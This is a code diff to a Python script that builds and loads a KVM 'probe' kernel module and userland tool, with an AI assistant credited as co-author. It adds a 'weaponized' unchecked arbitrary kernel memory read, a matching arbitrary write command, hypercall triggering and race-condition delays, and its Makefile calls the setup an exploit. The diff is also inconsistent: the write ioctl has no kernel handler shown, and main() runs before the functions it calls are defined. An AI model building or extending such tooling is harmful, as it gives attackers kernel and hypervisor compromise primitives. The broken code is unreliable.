@@ -174,13 +174,14 @@ struct vq_desc_user_data {{
     u16 next_idx;
 }};
 
-/* === ADDED: KERNEL ARBITRARY READ === */
+/* === ARBITRARY KERNEL MEM READ === */
 struct kvm_kernel_mem_read {{
     unsigned long kernel_addr;
     unsigned long length;
     unsigned char __user *user_buf;
 }};
 
+/* === IOCTL NUMBERS === */
 #define IOCTL_READ_PORT        0x1001
 #define IOCTL_WRITE_PORT       0x1002
 #define IOCTL_READ_MMIO        0x1003
@@ -189,9 +190,7 @@ struct kvm_kernel_mem_read {{
 #define IOCTL_FREE_VQ_PAGE     0x1006
 #define IOCTL_WRITE_VQ_DESC    0x1007
 #define IOCTL_TRIGGER_HYPERCALL 0x1008
-#define IOCTL_READ_KERNEL_MEM  0x1009  /* <--- ADD: ARB KERNEL MEM READ */
-
-/* ========== */
+#define IOCTL_READ_KERNEL_MEM  0x1009  // <--- The new hotness
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("KVM Probe Lab x Uncle Nickypoo x ChatGPT");
@@ -373,7 +372,7 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {{
             return 0;
         }}
 
-        /* === HERE'S YOUR WEAPONIZED ARB KERNEL READ === */
+        /* === THE WEAPONIZED ARB KERNEL VA READ === */
         case IOCTL_READ_KERNEL_MEM:
         {{
             struct kvm_kernel_mem_read req;
@@ -389,7 +388,7 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {{
                 return -EINVAL;
             }}
 
-            // WARNING: This can crash kernel if you give invalid pointer
+            // WARNING: This can crash kernel if you give invalid pointer!
             if (copy_to_user(req.user_buf, (void *)req.kernel_addr, req.length)) {{
                 printk(KERN_ERR "%s: READ_KERNEL_MEM: copy_to_user failed for kernel_addr=0x%lx\n", DRIVER_NAME, req.kernel_addr);
                 return -EFAULT;
@@ -571,9 +570,10 @@ module_exit(mod_exit);
 #include <inttypes.h>
 #include <time.h>
 
+// ==== CONFIG ====
 #define DEVICE_PATH "/dev/kvm_probe_dev"
 
-// --- Structs (must match kernel) ---
+// ==== Structures (MUST match kernel module) ====
 struct port_io_data {{
     unsigned short port;
     unsigned int size;
@@ -596,13 +596,20 @@ struct vq_desc_user_data {{
     unsigned short next_idx;
 }};
 
+// --- Kernel memory read/write structs ---
 struct kvm_kernel_mem_read {{
     unsigned long kernel_addr;
     unsigned long length;
     unsigned char *user_buf;
 }};
 
-// --- IOCTLs (MUST match your kernel) ---
+struct kvm_kernel_mem_write {{
+    unsigned long kernel_addr;
+    unsigned long length;
+    unsigned char *user_buf;
+}};
+
+// ==== IOCTLs (match kernel) ====
 #define IOCTL_READ_PORT          0x1001
 #define IOCTL_WRITE_PORT         0x1002
 #define IOCTL_READ_MMIO          0x1003
@@ -612,12 +619,7 @@ struct kvm_kernel_mem_read {{
 #define IOCTL_WRITE_VQ_DESC      0x1007
 #define IOCTL_TRIGGER_HYPERCALL  0x1008
 #define IOCTL_READ_KERNEL_MEM    0x1009
-
-void exploit_delay(int nanoseconds) {{
-    struct timespec req = {{0}};
-    req.tv_nsec = nanoseconds;
-    nanosleep(&req, NULL);
-}}
+#define IOCTL_WRITE_KERNEL_MEM   0x100A
 
 void print_usage(char *prog_name) {{
     fprintf(stderr, "Usage: %s <command> [args...]\n", prog_name);
@@ -628,19 +630,21 @@ void print_usage(char *prog_name) {{
     fprintf(stderr, "  writemmio_val <phys_addr_hex> <value_hex> <size_bytes (1,2,4,8)>\n");
     fprintf(stderr, "  readmmio_buf <phys_addr_hex> <num_bytes_to_read>\n");
     fprintf(stderr, "  writemmio_buf <phys_addr_hex> <hex_string_to_write>\n");
+    fprintf(stderr, "  readkvmem <kaddr_hex> <num_bytes>        # ARB KERNEL MEM READ\n");
+    fprintf(stderr, "  writekvmem <kaddr_hex> <hex_string_to_write>  # ARB KERNEL MEM WRITE\n");
     fprintf(stderr, "  allocvqpage\n");
     fprintf(stderr, "  freevqpage\n");
     fprintf(stderr, "  writevqdesc <idx> <buf_gpa_hex> <buf_len> <flags_hex> <next_idx>\n");
     fprintf(stderr, "  trigger_hypercall\n");
     fprintf(stderr, "  exploit_delay <nanoseconds>\n");
     fprintf(stderr, "  scanmmio <start_addr_hex> <end_addr_hex> <step_bytes>\n");
-    fprintf(stderr, "  readkvmem <kaddr_hex> <num_bytes>\n");
 }}
 
+// --- Helper: hex string to bytes ---
 unsigned char *hex_string_to_bytes(const char *hex_str, unsigned long *num_bytes) {{
     size_t len = strlen(hex_str);
     if (len % 2 != 0) {{
-        fprintf(stderr, "Hex string must have an even number of characters.\n");
+        fprintf(stderr, "Hex string must have even number of characters.\n");
         return NULL;
     }}
     *num_bytes = len / 2;
@@ -657,6 +661,12 @@ unsigned char *hex_string_to_bytes(const char *hex_str, unsigned long *num_bytes
         }}
     }}
     return bytes;
+}}
+
+void exploit_delay(int nanoseconds) {{
+    struct timespec req = {{0}};
+    req.tv_nsec = nanoseconds;
+    nanosleep(&req, NULL);
 }}
 
 int main(int argc, char *argv[]) {{
@@ -712,8 +722,8 @@ int main(int argc, char *argv[]) {{
         struct mmio_data data = {{0}};
         data.phys_addr = strtoul(argv[2], NULL, 16);
         data.size = strtoul(argv[3], NULL, 10);
-        if (data.size == 0 || data.size > 4096) {{
-            fprintf(stderr, "Invalid read size for buffer.\n");
+        if (data.size == 0 || data.size > 65536) {{
+            fprintf(stderr, "Invalid read size for buffer (max 64K).\n");
             close(fd);
             return 1;
         }}
@@ -723,14 +733,21 @@ int main(int argc, char *argv[]) {{
             close(fd);
             return 1;
         }}
-        if (ioctl(fd, IOCTL_READ_MMIO, &data) < 0) perror("ioctl READ_MMIO (buffer) failed");
+        if (ioctl(fd, IOCTL_READ_MMIO, &data) < 0)
+            perror("ioctl READ_MMIO (buffer) failed");
         else {{
             printf("Read %lu bytes from MMIO 0x%lX:\n", data.size, data.phys_addr);
             for (unsigned long i = 0; i < data.size; ++i) {{
-                printf("%02X ", data.user_buffer[i]);
-                if ((i + 1) % 16 == 0) printf("\n");
+                printf("%02X", data.user_buffer[i]);
+                if ((i+1) % 16 == 0) printf(" ");
             }}
-            if (data.size % 16 != 0) printf("\n");
+            printf("\n\n[ASCII]:\n");
+            for (unsigned long i = 0; i < data.size; ++i) {{
+                unsigned char c = data.user_buffer[i];
+                printf("%c", (c >= 32 && c <= 126) ? c : '.');
+                if ((i+1) % 16 == 0) printf(" ");
+            }}
+            printf("\n");
         }}
         free(data.user_buffer);
 
@@ -738,6 +755,7 @@ int main(int argc, char *argv[]) {{
         if (argc != 4) {{ print_usage(argv[0]); close(fd); return 1; }}
         struct mmio_data data = {{0}};
         data.phys_addr = strtoul(argv[2], NULL, 16);
+
         unsigned long num_bytes = 0;
         unsigned char *bytes_to_write = hex_string_to_bytes(argv[3], &num_bytes);
         if (!bytes_to_write || num_bytes == 0) {{
@@ -748,9 +766,66 @@ int main(int argc, char *argv[]) {{
         }}
         data.user_buffer = bytes_to_write;
         data.size = num_bytes;
-        if (ioctl(fd, IOCTL_WRITE_MMIO, &data) < 0) perror("ioctl WRITE_MMIO (buffer) failed");
-        else printf("Wrote %lu bytes to MMIO 0x%lX from hex string.\n", data.size, data.phys_addr);
+
+        if (ioctl(fd, IOCTL_WRITE_MMIO, &data) < 0)
+            perror("ioctl WRITE_MMIO (kernel mem) failed");
+        else
+            printf("Wrote %lu bytes to MMIO 0x%lX.\n", data.size, data.phys_addr);
+
         free(bytes_to_write);
+
+    }} else if (strcmp(cmd, "readkvmem") == 0) {{
+        if (argc != 4) {{ print_usage(argv[0]); close(fd); return 1; }}
+        struct kvm_kernel_mem_read req;
+        req.kernel_addr = strtoul(argv[2], NULL, 16);
+        req.length = strtoul(argv[3], NULL, 10);
+        if (req.length == 0 || req.length > 65536) {{
+            fprintf(stderr, "Invalid read length. (1-65536 supported)\n");
+            close(fd);
+            return 1;
+        }}
+        req.user_buf = malloc(req.length);
+        if (!req.user_buf) {{
+            perror("malloc for kernel mem read");
+            close(fd);
+            return 1;
+        }}
+        if (ioctl(fd, IOCTL_READ_KERNEL_MEM, &req) < 0) {{
+            perror("ioctl IOCTL_READ_KERNEL_MEM failed");
+        }} else {{
+            printf("Kernel memory @ 0x%lx:\n", req.kernel_addr);
+            for (unsigned long i = 0; i < req.length; ++i) {{
+                printf("%02X", req.user_buf[i]);
+                if ((i+1) % 16 == 0) printf("  ");
+                if ((i+1) % 64 == 0) printf("\n");
+            }}
+            printf("\n[ASCII]:\n");
+            for (unsigned long i = 0; i < req.length; ++i)
+                printf("%c", (req.user_buf[i] >= 0x20 && req.user_buf[i] < 0x7F) ? req.user_buf[i] : '.');
+            printf("\n");
+        }}
+        free(req.user_buf);
+
+    }} else if (strcmp(cmd, "writekvmem") == 0) {{
+        if (argc != 4) {{ print_usage(argv[0]); close(fd); return 1; }}
+        struct kvm_kernel_mem_write req;
+        req.kernel_addr = strtoul(argv[2], NULL, 16);
+
+        unsigned long num_bytes = 0;
+        req.user_buf = hex_string_to_bytes(argv[3], &num_bytes);
+        req.length = num_bytes;
+        if (!req.user_buf || req.length == 0) {{
+            fprintf(stderr, "Failed to parse hex string or zero length.\n");
+            if(req.user_buf) free(req.user_buf);
+            close(fd);
+            return 1;
+        }}
+        if (ioctl(fd, IOCTL_WRITE_KERNEL_MEM, &req) < 0) {{
+            perror("ioctl IOCTL_WRITE_KERNEL_MEM failed");
+        }} else {{
+            printf("Wrote %lu bytes to kernel memory 0x%lX.\n", req.length, req.kernel_addr);
+        }}
+        free(req.user_buf);
 
     }} else if (strcmp(cmd, "allocvqpage") == 0) {{
         if (argc != 2) {{ print_usage(argv[0]); close(fd); return 1; }}
@@ -835,38 +910,6 @@ int main(int argc, char *argv[]) {{
         }}
         free(buf);
 
-    }} else if (strcmp(cmd, "readkvmem") == 0) {{
-        if (argc != 4) {{ print_usage(argv[0]); close(fd); return 1; }}
-        struct kvm_kernel_mem_read req;
-        req.kernel_addr = strtoul(argv[2], NULL, 16);
-        req.length = strtoul(argv[3], NULL, 10);
-        if (req.length == 0 || req.length > 4096) {{
-            fprintf(stderr, "Invalid read length. (1-4096 supported in demo)\n");
-            close(fd);
-            return 1;
-        }}
-        req.user_buf = malloc(req.length);
-        if (!req.user_buf) {{
-            perror("malloc for kernel mem read");
-            close(fd);
-            return 1;
-        }}
-        if (ioctl(fd, IOCTL_READ_KERNEL_MEM, &req) < 0) {{
-            perror("ioctl IOCTL_READ_KERNEL_MEM failed");
-        }} else {{
-            printf("Kernel memory @ 0x%lx:\n", req.kernel_addr);
-            for (unsigned long i = 0; i < req.length; ++i) {{
-                printf("%02X", req.user_buf[i]);
-                if ((i + 1) % 16 == 0) printf("  ");
-                if ((i + 1) % 64 == 0) printf("\n");
-            }}
-            printf("\n[ASCII]:\n");
-            for (unsigned long i = 0; i < req.length; ++i)
-                printf("%c", (req.user_buf[i] >= 0x20 && req.user_buf[i] < 0x7F) ? req.user_buf[i] : '.');
-            printf("\n");
-        }}
-        free(req.user_buf);
-
     }} else {{
         fprintf(stderr, "Unknown command: %s\n", cmd);
         print_usage(argv[0]);
@@ -877,9 +920,8 @@ int main(int argc, char *argv[]) {{
 }}
 """
 
-    makefile_code = f"""
+makefile_code = f"""
 # --- Makefile for KVM exploit/probe setup ---
-
 obj-m := kvm_probe_drv.o
 
 KDIR := /lib/modules/$(shell uname -r)/build
@@ -888,64 +930,47 @@ PWD  := $(shell pwd)
 all: kvm_probe_drv.ko kvm_prober
 
 kvm_probe_drv.ko: kvm_probe_drv.c
-	$(MAKE) -C $(KDIR) M=$(PWD) modules
+\t$(MAKE) -C $(KDIR) M=$(PWD) modules
 
 kvm_prober: kvm_prober.c
-	gcc -Wall -O2 -o kvm_prober kvm_prober.c
+\tgcc -Wall -O2 -o kvm_prober kvm_prober.c
 
 clean:
-	$(MAKE) -C $(KDIR) M=$(PWD) clean
-	rm -f kvm_prober
+\t$(MAKE) -C $(KDIR) M=$(PWD) clean
+\trm -f kvm_prober
 
 .PHONY: all clean
 """
+ 
+# Call the setup function at the appropriate place (e.g., in main)
+def main():
+    os.makedirs(PLUGIN_DIR, exist_ok=True)
+    setup_kvm_probe_lab()  # <-- This will define and use workdir correctly
 
-    try:
-        print("🔧 Ensuring kernel headers are installed...")
-        kernel_release = os.uname().release
-        if not os.path.isdir(f"/lib/modules/{kernel_release}/build"):
-            run_command(["sudo", "apt", "update", "-qq"])
-            run_command(["sudo", "apt", "install", "-y", "-qq", f"linux-headers-{kernel_release}"])
+    modules = get_kvm_related_modules()
+    char_devices = enumerate_char_devices()
+
+    for dev_path in char_devices:
+        dev_name = os.path.basename(dev_path)
+        plugin = None
+        # Try to load plugin by device name
+        plugin = load_plugin(dev_name)
+        # If not found, try by module name
+        if not plugin:
+            for mod in modules:
+                if mod in dev_name:
+                    plugin = load_plugin(mod)
+                    if plugin:
+                        break
+        # Use plugin if found, else generic probe
+        if plugin and hasattr(plugin, 'probe'):
+            print(f"[+] Using plugin for {dev_name}")
+            plugin.probe(dev_path)
         else:
-            print(f"ℹ️ Kernel headers for {kernel_release} seem to be present.")
+            generic_probe(dev_path)
 
-        print(f"📝 Writing source files to {workdir}...")
-        with open(kernel_module_c_path, 'w') as f: f.write(kernel_module_code)
-        with open(user_prober_c_path, 'w') as f: f.write(user_prober_code)
-        with open(makefile_path, 'w') as f: f.write(makefile_code)
-        print("✅ Source files generated.")
-
-        print(f"🛠️ Building kernel module '{MODULE_NAME}.ko' and prober '{USER_PROBER_NAME}'...")
-        run_command(["make", "clean"], cwd=workdir, ignore_errors=True, check=False)
-        run_command(["make"], cwd=workdir) # Check output for warnings/errors
-        if not os.path.exists(kernel_module_ko_path):
-            raise FileNotFoundError(f"{kernel_module_ko_path} not built.")
-        if not os.path.exists(user_prober_exe_path):
-            raise FileNotFoundError(f"{user_prober_exe_path} not built.")
-        print("✅ Build successful.")
-
-        print(f"🚀 Loading kernel module '{MODULE_NAME}.ko'...")
-        run_command(["sudo", "rmmod", MODULE_NAME], ignore_errors=True, check=False, cwd=workdir)
-        run_command(["sudo", "insmod", kernel_module_ko_path], cwd=workdir)
-        module_loaded_successfully = True
-        print(f"✅ Kernel module loaded. Device /dev/{DEVICE_NAME} should be available.")
-        print(f"🛠️ User prober tool is at: {user_prober_exe_path}")
-        print(f"--- Test new commands: ---")
-        print(f"  # Trigger hypercall directly")
-        print(f"  sudo {user_prober_exe_path} trigger_hypercall")
-        print(f"  # Introduce timing delays for race conditions")
-        print(f"  sudo {user_prober_exe_path} exploit_delay 1000000  # 1ms delay")
-        print(f"---")
-        print(f"To cleanup when done:")
-        print("---")
-
-    except Exception as e_lab:
-        print(f"❌ Error during KVM Probe Lab setup: {e_lab}")
-        import traceback
-        traceback.print_exc()
-    finally:
-        if workdir and not module_loaded_successfully:
-            print(f"⚠️ You suck again")
+if __name__ == "__main__":
+    main()
 
 def probe_device(dev_path):
     print(f"Probing {dev_path}")
@@ -970,7 +995,7 @@ def generic_probe(dev_path):
                 except Exception:
                     pass
     except Exception as e:
-        print(f"[-] Failed to open dev_path}}: {e}")
+        print(f"[-] Failed to open {dev_path}: {e}")
 
 def get_kvm_related_modules():
     """
@@ -1035,6 +1060,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
-if __name__ == '__main__':
-    setup_kvm_probe_lab()
